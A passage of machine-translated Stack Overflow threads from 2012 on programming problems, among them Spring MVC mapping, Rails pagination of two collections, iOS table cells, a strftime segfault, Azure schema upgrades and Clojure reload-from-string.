问题是什么？为什么我没有访问该控制器文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:23:45.047

你的控制器类的位置是什么？

在您的应用程序上下文 xml 文件中添加基本包。

```
<context:component-scan base-package="com.sparkle" /> 
```

也试试

```
<% 
System.out.println("--inside index--");
response.sendRedirect("jsp/newUser.jav"); %> 
```

在你的jsp中

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-03T08:57:34.253

如果您使用的是[org.springframework.web.servlet.handler.SimpleUrlHandlerMapping](http://static.springsource.org/spring/docs/2.0.x/api/org/springframework/web/servlet/handler/SimpleUrlHandlerMapping.html)然后使用来定义这个

```
 <property name="mappings"><props> <prop key="/url.com">controllerName</prop> 
<bean id="controllerName" class="controllerclass"> </bean> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T11:23:25.820

我认为您在这里几乎没有错误，或者至少看起来如此。

1）首先，在`UserController`你 return `new ModelAndView("registerUser")`。这意味着注册的视图解析器应该寻找一个名为 name 的视图`registerUser`。您的代码注册视图解析器，其 id`viewResolver`指向`/JSP/`后缀`.jsp`。请将其修改为`WEB-INF/views`，这样它们就不会在 Spring 之外被轻易访问（这通常是一个很好的安全预防措施）。现在，您的视图应该位于`WebContent/WEB-INF/views/registerUser.jsp`. 请注意，视图的名称用于定位特定的视图文件。

2）在您设置的控制器中，`@RequestMapping(value="/newUser", method=RequestMethod.GET)`但您明确告诉 Spring 仅使用`*.jav`路径（in `web.xml`）映射请求。`/newUser`因此，Spring 甚至不会处理任何调用。确保`<url-pattern>*</url-pattern>`为 servlet 使用映射。

3) 看起来您想设置 Spring 而不了解它是如何工作的一些基本知识。请务必阅读互联网上一些不错的教程，并参考 Spring 的参考资料进行深入描述。否则你就是在自找麻烦。使用框架需要一些学习曲线，否则您很快就会感到沮丧。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T10:10:08.207

由于您仅在控制台上获得“--inside index--”而不是“内部控制器”，因此问题似乎是请求未到达控制器。

在线的

```
response.sendRedirect("newUser.jav"); %> 
```

尝试在您的查询前添加“/”。

另外，您是否尝试过使用下面的“/*.jav”

```
<servlet-mapping>
    <servlet-name>dispatcher</servlet-name>
    <url-pattern>*.jav</url-pattern> // have you tried /*.jav 
  </servlet-mapping> 
```

# doctrine - 阻止学说获取相关实体

> ID：10597893
> 
> 赞同：0
> 
> 时间：2012-05-15T09:31:09.807
> 
> 标签：doctrine, doctrine-1.2

当通常使用学说从数据库中获取实体时，您会将所有相关实体作为实际类获取`JOIN`，如果您有很多关系，这会导致巨大的查询。

但有时我只想获取实际对象，而不是所有关联实体，只是它们的 ID。

是否可以告诉教义只获取主要实体而不管关系？

**更新：**对不起，错过了版本：我在一个旧项目上使用 Doctrine 1.2。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:34:14.530

默认情况下，Doctrine 使用“延迟加载”：如果您不尝试访问它们，它将不会检索关联的实体。

如果您只使用主实体的 ID，它将永远不会检索关联的实体。

如果您希望它更加懒惰，请尝试使用`EXTRA_LAZY` [param](http://readthedocs.org/docs/doctrine-orm/en/latest/tutorials/extra-lazy-associations.html?highlight=lazy)。

# php - 嵌套列表上的jQuery奇偶数

> ID：10597897
> 
> 赞同：5
> 
> 时间：2012-05-15T09:31:26.587
> 
> 标签：php, jquery, list

**jQuery** :

```
$("li:even div").removeClass("odd even").addClass("odd");
$("li:odd div").removeClass("odd even").addClass("even");​ 
```

[http://jsfiddle.net/hashie5/vk6rZ/](http://jsfiddle.net/hashie5/vk6rZ/)

正如您在小提琴中看到的那样，奇数/偶数无法正常工作，我做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:36:50.830

这是一个工作示例

[http://jsfiddle.net/joycse06/vk6rZ/4/](http://jsfiddle.net/joycse06/vk6rZ/4/)

定位直系子女（div）

```
$("li:even > div").removeClass("odd even").addClass("odd");
$("li:odd > div").removeClass("odd even").addClass("even");​ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:35:59.740

看看`li:even>div`而不是`li:even div`

```
$("li:even>div").removeClass("odd even").addClass("odd");
$("li:odd>div").removeClass("odd even").addClass("even"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:43:12.273

你可以使用这个：http: [//jsfiddle.net/hashie5/vk6rZ/](http://jsfiddle.net/hashie5/vk6rZ/)

```
$("li:even > div").removeClass("odd even").addClass("odd");
$("li:odd > div").removeClass("odd even").addClass("even"); 
```

# php - PHP + UnixODBC + FreeTDS - SELECT [field] AS [name] 不起作用

> ID：10597898
> 
> 赞同：1
> 
> 时间：2012-05-15T09:31:27.480
> 
> 标签：php, sql, sql-server, freetds, unixodbc

我有一个安装了 PHP 5.2.13 的 unix 服务器，它可以访问两个 SQL 服务器（一个运行 MSSQL SERVER 2000，另一个运行 MSSQL 2005）。

它使用 FreeTDS - 详细信息：

*   版本：freetds v0.82
*   freetds.conf 目录：/usr/local/etc
*   MS db-lib 源兼容性：否
*   Sybase 二进制兼容性：否
*   线程安全：是
*   iconv 库：是的
*   TDS 版本：8.0
*   iODBC：没有
*   unixodbc：是的

我正在使用 unixODBC-2.3.1

MSSQL 2000 服务器很好，我可以像使用 MySQL 一样运行所有 SQL 语句并使用 mssql_num_rows 和 mssql_fetch_assoc。

但是，MSSQL 2005 服务器不能使用 mssql_num_rows 或 mssql_fetch_assoc - 您必须使用 odbc_fetch_row。

这不是一个真正的问题，我认为这只是由于不同的服务器安装。

但是，我对 MSSQL 2005 服务器有一个大问题：我不能选择一个字段作为另一个名称！

例如：

```
SELECT
   [EnquiryID] AS "The_Key"
   FROM [db].[dbo].[table] 
```

在我的管理应用程序中工作正常（即：不是 PHP），但如果我在我的 PHP 环境中运行相同，我得到：

```
stdClass Object
(
    [PK_EnquiryID] => 1
) 
```

你可以看到它应该是`[The_Key] => 1`

有人知道我们如何解决这个问题吗？我要扯头发了！

干杯

尼尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T09:23:36.607

我认为这已在 freeTDS 列表中得到解答，但问题在于 PHP，它对 ODBC 进行了错误调用，因此获取了基表名称，而不是在这种情况下您需要的标签。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T18:04:08.933

这绝不是一个完美的解决方案，我很想学习处理这个问题的正确方法，但与此同时，添加

```
+''
```

到每一列，在基础列名之后，但在 AS 别名之前，您应该能够规避这个问题。

# ruby-on-rails - 如何在同一个视图中呈现两个分页和 ajaxable 集合？

> ID：10597904
> 
> 赞同：8
> 
> 时间：2012-05-15T09:31:36.560
> 
> 标签：ruby-on-rails, ajax, will-paginate

在 Rails 3.2 索引视图中，我正在渲染两个部分。

```
<%= render :partial => 'users/user', :locals => {:users => @happy_users} %>
<%= render :partial => 'users/user', :locals => {:users => @sad_users} %> 
```

并且在部分

```
<% users.each do |user| %>
  Show some fields
<% end %>
<%= will_paginate users %> 
```

分页不起作用。

如果我更改`will_paginate`为使用实例变量，则分页有效（但集合错误）

```
<%= will_paginate @users %> 
```

调用部分时如何将本地人传递给 will_paginate？

（我意识到我还需要通过`:param_name`才能让这个与两个集合一起工作。现在我只是想让一个实例工作。）

部分通过 index.js.erb 呈现

```
$(".ajaxable-users").html('<%= escape_javascript(render("users/user")) %>'); 
```

控制器看起来像

```
def index
  @users = User.scoped.paginate(:page => params[:page], :per_page => 5)
  @happy_users = User.happy_scope.paginate(:page => params[:page], :per_page => 5)  
  @sad_users = User.happy_scope.paginate(:page => params[:page], :per_page => 5)  

  respond_to do |format|
      format.html # index.html.erb
      format.xml  { render :xml => @users }
      format.json { render :json => @users }
      format.js
  end
end 
```

感谢您的任何想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T12:52:52.060

1.  您需要确保控制器知道您按下**哪个列表的哪个页面链接。**我们通过将参数传递给 will_paginate 页面链接生成器来做到这一点。
2.  在刷新任一列表的分页时，您需要确保您的 js 更新正确的 html 标记。我们通过将分页包装在一个与情绪相关的 :) div 标签中来做到这一点。
3.  因为我们共享部分，所以我们需要确保在控制器中设置情绪和正确的集合，并从索引视图（html 和 js）作为本地传递给部分。
4.  最后确保您的 ajax 遥控器在您重绘分页后拾起（这是一个奖励）

因此，根据请求情绪参数设置控制器实例变量

*   请注意，此代码还为您节省了一些数据库调用，因为如果您只是对悲伤的用户进行分页，则不需要检索快乐的用户或全部）。
*   为简单起见，我省略了@users，它从未使用过
*   我怀疑悲伤用户的快乐范围只是一个错字

.

```
# controller
def index
  @mood = params[:mood]
  @mood_users = @happy_users = User.happy_scope.paginate(:page => params[:page], :per_page => 5) if @mood.blank? || @mood == 'happy'
  @mood_users = @sad_users = User.happy_scope.paginate(:page => params[:page], :per_page => 5) if @mood.blank? || @mood == 'sad'

  respond_to do |format|
      format.html # index.html.erb
      format.xml  { render :xml => @users }
      format.json { render :json => @users }
      format.js
  end
end 
```

确保我们将正确的本地人分派给局部：

```
# index.html.erb
<%= render :partial => 'users/user', :locals => {:users => @happy_users, :mood => 'happy' } %>
<%= render :partial => 'users/user', :locals => {:users => @sad_users, :mood => 'sad' } %> 
```

使部分情绪敏感，允许不同的 div 标签 ID。还将心情放在请求网址中。

```
# users/user partial
<div id='<%= "#{mood || ''}users"%>'>
<% users.each do |user| %>
  Show some fields
<% end %>
<%= will_paginate users, :params => { :mood => mood } %>
</div> 
```

此 js 允许根据按下的分页链接刷新不同 div 中的不同集合。

```
# index.js.erb
$("#<%= @mood %>users").html('
  <%= escape_javascript(render(partial: "users/user", locals: { users: @mood_users, mood: @mood })) %>
'); 
```

对于您需要的用于分页的不显眼的 ajax 链接。 [Ruby - Rails 3 - AJAXinate 分页和排序](https://stackoverflow.com/questions/10548727/ruby-rails-3-ajaxinate-paginate-and-sorting/10549986#10549986)

```
# in a generic js
$(document).ready(function () {
    $(".pagination").find("a").livequery(function () {
        $(this).attr("data-remote", true);
    });
}); 
```

请注意，即使未启用 javascript 并且我们使用 html，该解决方案也应该可以工作。在这种情况下，应该重新显示两个部分，以允许不同的页面。

**修改代码以处理优雅的 JS 回退到 HTML**

控制器

```
# controller
def index
  @mood = params[:mood]
  @happy_page = @mood == 'happy' ? params[:page] : params[:happy_page]
  @sad_page = @mood == 'sad' ? params[:page] : params[:sad_page]

  @mood_users = @happy_users = User.happy_scope.paginate(:page => @happy_page, :per_page => 5) if !request.xhr? || @mood == 'happy'
  @mood_users = @sad_users = User.happy_scope.paginate(:page => @sad_page, :per_page => 5) if !request.xhr? || @mood == 'sad'
  @mood_users = @users = User.scoped.paginate(:page => params[:page], :per_page => 5) if @mood.blank?

  respond_to do |format|
      format.html # index.html.erb
      format.xml  { render :xml => @users }
      format.json { render :json => @users }
      format.js
  end
end 
```

将新视图变量转发到部分本地

```
# index.html.erb
<%= render :partial => 'users/user', :locals => {:users => @happy_users, :mood => 'happy', :happy_page => @happy_page, :sad_page => @sad_page } %>
<%= render :partial => 'users/user', :locals => {:users => @sad_users, :mood => 'sad', :happy_page => @happy_page, :sad_page => @sad_page  } %> 
```

我们只需要在此处传递它就不会部分获得未定义的方法。

```
# index.js.erb (fixed HTML syntax)
$("#<%= @mood %>users").html('
  <%= escape_javascript(render(partial: "users/user", locals: { users: @mood_users, mood: @mood, :happy_page => @happy_page, :sad_page => @sad_page })) %>
'); 
```

如果单击悲伤的页面链接，这将在 param 中保留快乐的页面，反之亦然。

```
# users/user partial
<div id='<%= "#{mood || ''}users"%>'>
<% users.each do |user| %>
  Show some fields
<% end %>
<%= will_paginate users, :params => { :mood => mood, :happy_page => happy_page, :sad_page => sad_page  %>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-06T15:54:01.427

首先，在控制器中为每个列表创建两个不同的方法，例如 fill_list1 和 fill_list2 有独立的方法来创建主页例如索引

例如，每个列表方法都必须呈现没有布局的部分

```
render :partial=>'fill_list1', :layout => false 
```

主页必须第一次调用局部视图。

当您单击分页控件时，您必须破解单击以调用 ajax 下一个分页项列表

```
$('list1 a').live('click', function(event){
  event.preventDefault();
  $.ajax(
    {url:URLFORCALLMETHODLIST,
     success: function(content) {
                DIVLOCATIONLIST.html(content);
              },
     async:false,
    });
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-15T10:06:05.873

尝试在以下位置传递适当的本地人`index.html.erb`：

```
$(".ajaxable-users").html('
  <%= escape_javascript(render("users/user", locals: { users: @users })) %>
'); 
```

# iphone - 一次只展开“一个”单元格？目前我可以打开多个

> ID：10597910
> 
> 赞同：0
> 
> 时间：2012-05-15T09:32:09.923
> 
> 标签：iphone, ios, ios5, uitableview

我按照 Simon Lee 的动画 uitableview 高度变化[教程进行操作，效果非常好！](http://locassa.com/index.php/animate-uitableview-cell-height-change/)我似乎面临的唯一问题是我可以点击几个单元格，并且无论另一个单元格是否已经展开，它们都将保持展开状态。我只希望在任何给定时间扩展一个，如果另一个已经扩展，则在新扩展之前将其关闭。

Simon 提到我们应该“将单个 NSIndexPath 存储为当前选定项，而不是存储在索引数组中”。我不完全确定如何做到这一点。如果有人能帮忙，那就太棒了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:16:04.910

你所要做的就是在下面的 tableView 委托方法中添加下面的`tableView:didSelectRowAtIndexPath:`代码

```
[selectedIndexes setObject:selectedIndex forKey:indexPath]; 
```

要添加的代码

```
NSArray *key = selectedIndexes.allKeys;
for (int i = 0; i < [key count]; i++) {
    if (![[key objectAtIndex:i] isEqual:indexPath]) {
        [selectedIndexes setObject:[NSNumber numberWithBool:NO] forKey:[key objectAtIndex:i]];
    }
} 
```

快乐编码 :) 享受这一天！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T10:13:51.057

是的，您可以使用 UITableView -(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 和 - (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath 的委托方法折叠单元格： -

首先声明变量获取indexPath

```
NSIndexPath *selectedCellIndexPath; 
```

然后在 didSelectRowAtIndexPath 中获取单元格的 indexPath ：-

```
 -(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
{
            selectedCellIndexPath=indexPath;

    [tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationBottom];
} 
```

然后进行折叠和延伸并设置上下高度：-

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath 
{  
            if(selectedCellIndexPath != nil  
       && [selectedCellIndexPath compare:indexPath] == NSOrderedSame)  
        return yourCellsExtendedHeightInInteger;  

    return yourCellsCollapsedHeightInInteger;  
} 
```

或使用

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath 
{    
   if(selectedCellIndexPath && indexPath.row == selectedCellIndexPath .row) 
{         
return 100;    
}    
return 44; 
} 
```

您还可以查看本[教程](http://www.roostersoftstudios.com/2011/04/14/iphone-uitableview-with-animated-expanding-cells/)：-

# linux - strftime_l lib64/libc.so.6 处的 SIGSEGV 分段错误

> ID：10597913
> 
> 赞同：4
> 
> 时间：2012-05-15T09:32:21.890
> 
> 标签：linux, unix

我正在将 pro*c 代码从 UNIX 移植到 LINUX。代码已成功编译并创建可执行文件。但是在运行时它会引发分段错误。我一步一步调试了代​​码，下面是GDB调试的输出。

```
 Breakpoint 4 at 0x3b19690f50
 (gdb) n
 525             strftime (buf, MAX_STRING_LEN, "%d/%b/%Y:%H:%M:%S", dummy_time);
 (gdb) n

 Breakpoint 4, 0x0000003b19690f50 in strftime () from /lib64/libc.so.6
 (gdb) n
 Single stepping until exit from function strftime,
 which has no line number information.
 0x0000003b19690f70 in strftime_l () from /lib64/libc.so.6
 (gdb) n
 Single stepping until exit from function strftime_l,
 which has no line number information.

 Program received signal SIGSEGV, Segmentation fault.
 0x0000003b19690f8b in strftime_l () from /lib64/libc.so.6 
```

实际上在代码中`strftime()`调用了该函数。但我不知道为什么它会到达`strftime_l()`/lib64/libc.so.6。

这个问题不会出现在 UNIX 中。请帮忙。代码是

```
static void speed_hack_libs(void)
{
    time_t dummy_time_t = time(NULL);
    struct tm *dummy_time = localtime (&dummy_time_t);
    struct tm *other_dummy_time = gmtime (&dummy_time_t);
    char buf[MAX_STRING_LEN];
    strftime (buf, MAX_STRING_LEN, "%d/%b/%Y:%H:%M:%S", dummy_time);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T11:19:49.460

```
struct tm *dummy_time = localtime (&dummy_time_t);
struct tm *other_dummy_time = gmtime (&dummy_time_t); 
```

这是行不通的。从[手册页](http://linux.die.net/man/3/localtime)：

> 该`localtime()`函数将日历时间 timep 转换为细分时间表示，表示相对于用户指定的时区。... **返回值指向一个静态分配的结构**，随后调用任何日期和时间函数可能会覆盖该结构。
> 
> 该`gmtime()`函数将日历时间 timep 转换为细分时间表示，以协调世界时 (UTC) 表示。 当年份不适合整数时， **它可能会返回 NULL 。****返回值指向一个静态分配的结构**，随后调用任何日期和时间函数可能会覆盖该结构。

所以，`*dummy_time`可能会在你使用它的时候被覆盖，并且包含不可预知的垃圾。您应该像这样将数据复制到缓冲区：

```
struct tm dummy_time ;
memcpy(&dummy_time, localtime (&dummy_time_t), sizeof(struct tm)); 
```

尽管我不确定这如何导致 SIGSEGV（可能是获取月份名称等问题 - 检查问题是否仍然存在`LC_ALL=C`），但您必须先解决此问题，然后才能继续。此外，检查（在调试器中）`*dummy_time`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T12:06:12.190

它调用 strftime_l 是因为您编译了 64 位 - 这是 strftime 的 64 位库入口点。strftime 中有两个指针 - 一个字符串和一个 struct tm 指针。其中之一是指向无效内存。jpalacek 为您提供了首先查看的位置。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-05-31T23:39:11.390

您是否添加了 time.h 头文件？我想你已经错过了。

# eclipse - Eclipse：当战争文件仅是 maven 依赖项而不是 Eclipse 项目时，在耳朵中调试战争

> ID：10597919
> 
> 赞同：0
> 
> 时间：2012-05-15T09:32:36.197
> 
> 标签：eclipse, debugging, maven, war

我们有以下包装：

```
something.ear (eclipse-project)
+webstuff.war (maven dependency only)
+businessstuff.ejb (eclipse-project) 
```

打包工作完美，我能够调试所有业务。但是我怎样才能让 webstuff.war 的源代码在 eclipse 中可见，从而设置刹车点并调试它呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T10:56:42.653

ear and war have only java class files(which is not editable) and not java source code. Better approach is to use some logging framework(i personally prefer log4j).

Every java project developed nowadays have used some logging framework, better search for them in the ear and war files.

On extracting the war file u can see some xml or .properties file which will say what loggong framework it uses.

# reporting - Can Sphinx help user-driven reporting requirements?

> ID：10597922
> 
> 赞同：0
> 
> 时间：2012-05-15T09:32:52.703
> 
> 标签：reporting, sphinx

I'm creating a mysql-centric site for our client who wants to do custom reporting on their data (via http), something like doing selects in PHPMyAdmin with readonly access (*). Perhaps like reporting in [Pentaho](http://reporting.pentaho.com/), though I've never used it.

My boss is saying [Sphinx](http://sphinxsearch.com/) is the answer, but reading through the Sphinx docs, I don't see that it will make user-driven reporting any easier. Does Sphinx help with user driven reporting? If so, what do they call it?

(*) the system has about 25 tables that would likely be used in reporting, with anywhere between 2 and 50 fields. Reports would likely need up to maybe 5 joins per report.

update: I found [http://code.google.com/p/sphinx-report/](http://code.google.com/p/sphinx-report/) so I guess Sphinx doesn't natively do it.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-17T12:59:48.253

I can only answer for SphinxSEARCH -- dont really know much about the other sphinxes.

It itself doesnt contain features particully for writing reports. Its a general purpose search backend. Just like mysql is not particully designed for reports, but it can be be used as such.

In general think of sphinx as providing a very flexible, fast and scalable 'index' to a database table. Almost like creating a materialized view in mysql.

Because you can think very carefully what data to include in this index. And the index can be 'denormalized' to include all the data (via complex joins if required) - you can then run very fast queries against this index.

Sphinx also supports "GROUP BY" which makes it very useful for creating reports - and because the attribute data is held entirely in memory its generally very fast.

Basically sphinx will be very good to provide the backend for a 'dynamic' and 'interactive' report system. Where speed is required - particully if combined with allowing the user to filter reports (via keywords) - that is where sphinx shines.

Because of the upfront work required in designing this index, its less suited for 'flexible' reports. In building the index, will probably be a number of comprimises, so might be limiting in what reports will be possible. (at least without creating lots of differnt indexes)

short version: lots of upfront work to build the system, for very fast queries down the line.

Sphinx wont really do anything that mysql can't. But using sphinx as part of the system will allow performance to be improved (over a pure mysql solution).

# java - 如何使用源导入 org.eclipse.pde.internal？

> ID：10597926
> 
> 赞同：0
> 
> 时间：2012-05-15T09:33:02.347
> 
> 标签：java, eclipse, eclipse-plugin, package, eclipse-pde

问题是，在“导入”的包列表中没有看到这个包及其子包。当我导入所有 pde 包时，org.eclipse.pde.internal 无论如何都会变得可用。但我没有看到它的来源。我该如何管理这个包？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T10:48:47.880

以下是来自 Eclipse 社区的一些规则，它们可能会有所帮助：

1.  包名称应与插件名称匹配。如果他们不从右边剥离。您寻找的代码应该在插件中`org.eclipse.pde.internal`（不存在）。剥离`internal`，你会得到一个现有的插件。

2.  OSGi 允许对其他插件隐藏插件 X 中的包。这个功能并没有真正使用。您仍然可以导入这些类，但 Eclipse 不会在代码完成中显示它们，并且您会收到警告。OSGi/bundle 类加载器有一个选项可以抛出`NoClassDefFoundError`，但该选项通常被禁用。`MANIFEST.MF`您可以在尝试从中导入的插件中找到导出列表。

    大多数未导出的包都在一个包下面`internal`，所以这是一个提示：不要使用这个代码。它不是官方 API 的一部分。它可以在 Eclipse 或插件的下一个版本中更改，并且没有人会关心您的代码是否中断（与官方 API 不同）。

当然，世界没有那么简单。这就是为什么不赞成使用内部代码但禁用类加载器选项的原因（= Eclipse 可以强制执行此行为，但他们不会）。

如果您认为某些内部 API 会很好用，请在[https://bugs.eclipse.org/bugs/提交错误报告](https://bugs.eclipse.org/bugs/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T11:05:04.590

我的同事解决了这个问题。

1.  `org.eclipse.pde.internal`在`org.eclipse.pde.ui`.

2.  Eclipse 3.7.2 根本没有 PDE 源。存储库中的相应目录为空。我降档到 3.7.0，现在可以了。

# jquery - JQuery：找到父母和另一个孩子

> ID：10597930
> 
> 赞同：1
> 
> 时间：2012-05-15T09:33:15.140
> 
> 标签：jquery

我有以下标记：

```
<div style="width: 660px; border-bottom: 1px solid #3A3F46;">
            <div class="noplace_event_cont">
                <div style="float: left;">
                    <span class="title">Usual</span> 
                    <span class="desc">Free: <span class="free_place">19</span></span>
                </div>
                <div style="float: right;">
                    <div class="spinner_cont">
                        <input type="text" data-type="1" class="event_spinner" value="0" maxlength="1" style="width: 24px; margin-right: 16px; text-align: right;"><span class="ui-spinner ui-widget"><div class="ui-spinner-buttons" style="height: 41px; left: -16px; top: -13.0833px; width: 36px;"><div class="ui-spinner-up ui-spinner-button ui-state-default ui-corner-tr" style="width: 16px; height: 20.5px;"><span class="ui-icon ui-icon-triangle-1-n" style="margin-left: 16.5px; margin-top: 15px;">&nbsp;</span></div><div class="ui-spinner-down ui-spinner-button ui-state-default ui-corner-br" style="width: 16px; height: 20.5px;"><span class="ui-icon ui-icon-triangle-1-s" style="margin-left: 16.5px; margin-top: 15px;">&nbsp;</span></div></div></span>
                    </div>
                </div>

            </div>
            <div class="noplace_event_cont">
                <div style="float: left;">
                    <span class="title">VIP</span> 
                    <span class="desc">Free: <span class="free_place">6</span></span>
                </div>
                <div style="float: right;">
                    <div class="spinner_cont">
                        <input type="text" data-type="2" class="event_spinner" value="0" maxlength="1" style="width: 24px; margin-right: 16px; text-align: right;"><span class="ui-spinner ui-widget"><div class="ui-spinner-buttons" style="height: 41px; left: -16px; top: -13.0833px; width: 36px;"><div class="ui-spinner-up ui-spinner-button ui-state-default ui-corner-tr" style="width: 16px; height: 20.5px;"><span class="ui-icon ui-icon-triangle-1-n" style="margin-left: 16.5px; margin-top: 15px;">&nbsp;</span></div><div class="ui-spinner-down ui-spinner-button ui-state-default ui-corner-br" style="width: 16px; height: 20.5px;"><span class="ui-icon ui-icon-triangle-1-s" style="margin-left: 16.5px; margin-top: 15px;">&nbsp;</span></div></div></span>
                    </div>
                </div>

            </div>
    </div> 
```

我想在课堂上找到`span`文字`free_place`：

```
$(".event_spinner").each(function () {
            var max = $(this).parent(".noplace_event_cont").find(".free_place").text();
            alert(max);
        }); 
```

但是，这段代码不起作用。`max`未定义。
谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:36:10.553

> 我想用 free_place 类在 span 中查找文本：

```
$('span .free_place').text() 
```

或这个：

```
$('span.free_place').text() 
```

很难理解您希望输出是什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:34:55.047

```
 $(".event_spinner").each(function () {
        var max = $(this).parents(".noplace_event_cont").find(".free_place").text();
        alert(max);
    }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:35:33.297

```
var max = $(this).closest(".noplace_event_cont").find(".free_place").text(); 
```

或者

```
var max = $(this).closest(".free_place").text(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T09:43:47.397

采用`.closest()`

[演示 jsFiddle](http://jsfiddle.net/vk6rZ/9/)

```
$(".event_spinner").each(function () {
            var max = $(this).closest(".noplace_event_cont").find(".free_place").text();
            alert(max);
}); 
```

# azure - 数据库架构更改时 Azure 无缝升级

> ID：10597933
> 
> 赞同：7
> 
> 时间：2012-05-15T09:33:25.293
> 
> 标签：azure

假设我有一个生产和暂存部署都使用他们自己的（SQL Azure）数据库。如果暂存中的模式已更改并需要部署到生产环境，是否有定义的方法可以在生产数据库上实现数据库升级（无需停机）？

例如，如果我交换 VIP 登台 <-> 生产（同时以某种方式自动更改连接字符串）自动升级 sql azure 数据库的最佳过程是什么。

我的想法是在 RoleEnvironmentChanging 中发现环境变化（尽管不确定 VIP 交换甚至会触发 RoleEnvironmentChanginging）并在那时针对未来的数据库（即 prod）运行 sql 脚本，但是我需要确保该脚本是只运行一次，就会有多个实例转换。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T14:23:50.523

因此，您拥有拥有自己的 SQL Azure 数据库的生产部署和拥有自己的 SQL Azure 数据库的登台部署。在这种情况下，两个应用程序的连接字符串都指向两个不同的数据库。

您的第一个要求是在交换部署或执行某些操作时动态更改数据库架构，我对该设计有以下担忧：

1.  如果您在角色内部编写任何代码来执行“ONCE and only ONCE”操作，则无法保证这只会发生 ONCE。它会发生多次取决于几种情况，例如

    1.1 在任何情况下，您的 VM 都需要由系统重新映像，并且此代码将执行与上次重新映像期间完全相同的操作

    1.2 您可以通过某些外部密钥的某些注册表方法来保护它不会在角色启动或 VM 启动时发生，但有完整的证明机制不会发生。

2.  因此，我建议当您准备好交换部署时，您可以：

    2.1 运行脚本以更新到与生产相关的 SQL Azure 架构（这不会影响应用程序下载，因为它没有被触及，但是当您的数据库架构更新时，您可能会更好地了解它如何影响您的应用程序）

    2.2 将 staging 部署中的配置更改为指向生产 SQL Azure（这根本不会有任何生产应用程序停机时间）

    2.3 交换部署（这也不会有应用程序停机时间）

因此，即使您手动更新数据库架构然后交换部署，除了数据库更新架构所花费的时间之外，也没有明显的停机时间。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-13T19:55:42.263

我一直在到处寻找最佳实践，但没有找到。到目前为止，这就是我所做的：

*   部署到登台（生产已在运行）
*   将 app_offline.htm 文件复制到生产环境的 Web 根目录。这样我就阻止用户使用应用程序，从而阻止对数据库的更改。我只使用一个实例。
*   备份数据库。
*   运行 DDL、DML 和 SP 脚本。这会将生产数据库更新为最新模式。
*   在 Staging 上测试应用程序。
*   换VIP。这会使应用程序重新联机，因为 app_offline.htm 文件在暂存（新生产）上不存在。
*   如果出现问题，再次交换 VIP，恢复数据库并删除 app_offline.htm。

使用这种方法，我的停机时间约为 5 分钟；我的数据库很小，这比等待创建虚拟机和用户出错要好。

# clojure - Clojure：从字符串重新加载

> ID：10597939
> 
> 赞同：2
> 
> 时间：2012-05-15T09:33:55.060
> 
> 标签：clojure

编辑：我想要的基本上是加载字符串吗？

## 问题

在 Clojure 中，如果我这样做：

```
(require :reload 'foo.bar) 
```

然后 Clojure 查找 src/foo/bar.clj，并重新加载它。

现在，我想做这样的事情：

```
(reload-from-string 'foo.bar STR) 
```

其语义是：重新加载命名空间 'foo.bar，但不是编译 src/foo/bar.clj，而是编译 STR。

如何定义 reload-from-string？

## 语境

我需要在运行 Clojure 应用程序的*服务器上热重载代码。*我不想为了重新加载而不得不不断地将文件来回移动到服务器（通过 scp、sftp 或 fuse/sshfs）。因此，我宁愿只传递一个字符串。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T11:01:46.883

您可以使用`read-string`然后`eval`. 但请记住风险。将它们分开的一个优点是您可以在评估结果列表之前将结果列表中的内容列入白名单。

您可能还想绑定`*read-eval*`到 false 。

# talend - Talend 培训/教程

> ID：10597942
> 
> 赞同：4
> 
> 时间：2012-05-15T09:34:03.190
> 
> 标签：talend

谁能推荐一个好的材料来源来学习如何使用 Talend Open Studio 进行数据集成？

我看过 TalendForge 教程，但想知道是否有针对初学者的更有凝聚力的培训资源？

我在互联网上搜索过，找不到任何不属于 TalendForge 的内容或评论很糟糕的书！

任何建议都非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-17T11:04:01.750

